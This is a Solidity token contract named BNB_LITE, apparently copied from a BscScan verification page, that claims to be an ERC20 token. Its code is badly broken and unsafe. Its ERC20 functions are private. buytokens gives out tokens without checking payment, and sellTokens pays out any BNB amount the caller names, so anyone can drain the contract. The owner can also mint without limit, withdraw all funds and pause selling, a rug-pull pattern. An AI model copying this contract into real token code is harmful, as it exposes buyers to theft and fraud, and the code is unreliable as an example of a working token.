/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: unlicensed
pragma solidity 0.8.4;
 
// ----------------------------------------------------------------------------
// ERC20 Token, with the addition of symbol, name and decimals
// assisted token transfers
// ----------------------------------------------------------------------------
contract BNB_LITE {
    string  public name = "BNB_LITE";
    string  public symbol = "BNBLITE";
    uint256 public _totalSupply = 100000000 * 10**18; // 100 million tokens
    uint256  public decimals = 18;
    address public owner;
    bool paused = false;
    bool internal locked;

    mapping(address => uint) balances;
 
    mapping(address => mapping(address => uint256)) allowed;
 
    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(
        address indexed tokenOwner,
        address indexed spender,
        uint256 tokens
    );
    event Paused(bool isPaused);
    event OwnershipTransferred(address newOwner);

    event TokensPurchased(
        address account,
        uint256 amount
    );
 
    event TokensSold(
        address account,
        uint amount,
        uint rate
    );
 
    // ------------------------------------------------------------------------
    // Constructor
    // ------------------------------------------------------------------------
    constructor() {
        balances[msg.sender] = _totalSupply;
        owner = msg.sender;
    }
   
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner is allowed");
        _;
    }
 
    modifier isPaused() {
        require(!paused, "Contract is in paused state");
        _;
    }

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
 
    // ------------------------------------------------------------------------
    // Total supply
    // ------------------------------------------------------------------------
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
 
    // ------------------------------------------------------------------------
    // Get the token balance for account tokenOwner
    // ------------------------------------------------------------------------
    function balanceOf(address tokenOwner)
        public
        view
        returns (uint256 balance)
    {
        return balances[tokenOwner];
    }
 
    // ------------------------------------------------------------------------
    // Transfer the balance from token owner's account to receiver account
    // - Owner's account must have sufficient balance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transfer(address receiver, uint256 tokens)
        private
        returns (bool success)
    {
        balances[owner] = balances[owner] - tokens;
        balances[receiver] = balances[receiver] + tokens;
        emit Transfer(owner, receiver, tokens);
        return true;
    }
 
    // ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account
    //
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
    // recommends that there are no checks for the approval double-spend attack
    // as this should be implemented in user interfaces
    // ------------------------------------------------------------------------
    function approve(address spender, uint256 tokens)
        private
        returns (bool success)
    {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    
    // ------------------------------------------------------------------------
    // Transfer tokens from sender account to receiver account
    //
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from sender account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transferFrom(
        address sender,
        address receiver,
        uint256 tokens
    ) private returns (bool success) {
        balances[sender] = balances[sender] - tokens;
        allowed[sender][owner] = allowed[sender][owner] - tokens;
        balances[receiver] = balances[receiver] + tokens;
        emit Transfer(sender, receiver, tokens);
        return true;
    }
 
    // ------------------------------------------------------------------------
    // Returns the amount of tokens approved by the owner that can be
    // transferred to the spender's account
    // ------------------------------------------------------------------------
    function allowance(address tokenOwner, address spender)
        private
        view
        returns (uint256 remaining)
    {
        return allowed[tokenOwner][spender];
    }
 
    // ------------------------------------------------------------------------
    function pause(bool _flag) external onlyOwner {
        paused = _flag;
        emit Paused(_flag);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address _newOwner)
        public
        virtual
        onlyOwner
    {
        owner = _newOwner;
        emit OwnershipTransferred(_newOwner);
    }
 
    /**
     * @dev function that burns an amount of the token
     * @param _value The amount that will be burnt.
     * @param _add The address from which tokens are to be burnt.
     */
    function burn(uint256 _value, address _add) onlyOwner public {
        require(_add == owner || _add == address(this));
         _totalSupply = _totalSupply - _value;
        balances[_add] = balances[_add] - _value;
        emit Transfer(_add, address(0), _value);
    }
 
    function mint(uint256 _value, address _add) onlyOwner public {
        require(_add == owner || _add == address(this));
        _totalSupply += _value;
        balances[_add] += _value;
        emit Transfer(_add, address(0), _value);
    }
 
    function withDrawOwner(uint256 _amount)onlyOwner public returns(bool){
        payable(msg.sender).transfer(_amount);
        return true;
    }

    function buytokens(uint256 token) public payable {
        require(msg.sender != owner, "Token Owner can not buy");
        require(balanceOf(owner) >= token);
        transfer(msg.sender, token);
        emit TokensPurchased(msg.sender, token);
    }

    function sellTokens(uint BNB, uint token) public isPaused noReentrant{
        require(balanceOf(msg.sender) >= BNB, "low _amount");
        payable(msg.sender).transfer(BNB);
        require(approve(owner, token), " approve not successed");
        uint256 allowance1 = allowance(msg.sender, owner);
        require(allowance1 >= token, "Check the token allowance");
        require(transferFrom(msg.sender, owner, token), " transfer not confirm");
        emit TokensSold(msg.sender, BNB, token);
    }

    function claim(address receiver ,uint _amount)onlyOwner public returns(bool){
        transfer(receiver, _amount);
        return true;
    }
}